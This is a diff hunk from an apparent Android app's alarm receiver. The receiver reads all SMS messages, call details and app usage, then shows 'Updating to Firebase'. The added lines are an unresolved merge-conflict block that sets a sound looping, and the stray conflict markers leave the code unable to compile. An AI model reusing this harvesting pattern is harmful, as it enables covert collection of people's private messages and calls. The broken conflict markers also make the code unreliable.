@@ -34,6 +34,14 @@ public class MyReceiver extends BroadcastReceiver {
         msghist.getAllSms(context);
         cal.getCallDetails(context);
         appst.printCurrentUsageStatus(context);
+<<<<<<< HEAD
+=======
+        mp = MediaPlayer.create(context, R.raw.amico);
+        mp.start();
+        mp.setLooping(true);
+
+
+>>>>>>> 537bc5ef6b80d1c1ab03ccb0fc934ac0d0506434
         Toast.makeText(context, "Updating to Firebase", Toast.LENGTH_LONG).show();
         Log.d("Alarm set","Alarm just fired");
     }
